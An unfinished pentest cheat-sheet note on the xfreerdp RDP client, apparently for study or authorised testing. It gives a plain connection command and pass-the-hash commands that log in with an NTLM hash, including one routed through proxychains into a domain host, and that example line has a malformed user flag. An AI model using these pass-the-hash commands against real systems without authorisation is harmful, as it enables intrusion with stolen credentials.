
>[!IMPORTANT]
> This note is a work-in-progress.


```shell
# Connect via RDP
xfreerdp /v:<ip_address>:<port> /u:<user> /p:<password> /dynamic-resolution +clipboard

# Pass-The-Hash (NTLM)
xfreerdp /u:<user> /pth:<ntlm_hash> /v:<ip_address>

# Example: PTH in a domain through a proxy
proxychains xfreerdp /:Joe.Schmoe /d:example.com /pth:1234qwer1234qwer1234 /v:192.168.1.10
```